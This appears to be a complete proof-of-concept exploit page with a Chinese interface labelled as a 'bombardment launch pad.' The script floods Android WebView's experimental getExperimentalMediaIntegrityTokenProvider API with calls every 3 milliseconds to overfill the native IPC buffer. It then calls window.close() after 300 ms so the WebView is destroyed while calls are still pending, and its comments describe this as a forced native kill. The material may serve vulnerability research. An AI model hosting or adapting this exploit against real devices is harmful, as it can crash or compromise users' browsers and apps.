<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>轰炸发射台</title>
    <style>
        body { font-family: sans-serif; background: #1a1a1a; color: #fff; text-align: center; padding: 30px; }
        .card { background: #262626; padding: 20px; border-radius: 12px; max-width: 400px; margin: 0 auto; }
        .btn-fire { width: 100%; padding: 16px; background: #FF3B30; color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; }
        .btn-fire:disabled { background: #555; cursor: not-allowed; }
        .counter { font-size: 32px; color: #FFD60A; font-family: monospace; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="card">
        <h3>加特林高频发射中...</h3>
        <div id="status" style="color: #34C759; font-weight: bold; margin-bottom: 10px;">正在检测 API...</div>
        <div class="counter" id="count">000000</div>
        <button class="btn-fire" id="fireBtn" disabled>💥 启动轰炸并自动关闭 Tab</button>
    </div>

    <script>
        const statusEl = document.getElementById('status');
        const fireBtn = document.getElementById('fireBtn');
        const countEl = document.getElementById('count');

        let total = 0;
        let timer = null;

        // 1. 验证真身路径
        const hasApi = window.android && window.android.webview && typeof window.android.webview.getExperimentalMediaIntegrityTokenProvider === 'function';

        if (hasApi) {
            statusEl.innerText = "✅ 接口已就绪";
            fireBtn.disabled = false;
        } else {
            statusEl.innerText = "❌ 未找到接口";
            statusEl.style.color = "#FF3B30";
        }

        // 2. 轰炸 + 闪现自毁
        fireBtn.onclick = function() {
            if (!hasApi) return;
            fireBtn.disabled = true;

            // ⚡ 每 3 毫秒盲轰一发，强行塞满原生 IPC 缓冲区
            timer = setInterval(function() {
                total++;
                countEl.innerText = String(total).padStart(6, '0');
                
                window.android.webview.getExperimentalMediaIntegrityTokenProvider({
                    cloudProjectNumber: 123456789
                }).catch(() => {});
            }, 3);

            // 🕒 300ms 后准时触发 window.close()
            // 此时原生层会开始销毁当前 WebView，而 IPC 通道里还留着刚刚发出去的余弹
            setTimeout(function() {
                clearInterval(timer);
                statusEl.innerText = "⏳ 正在执行原生强杀...";
                
                // 🎯 终极杀招：直接调用标准接口关闭窗口，触发原生 view.destroy()
                window.close(); 
            }, 300);
        };
    </script>
</body>
</html>
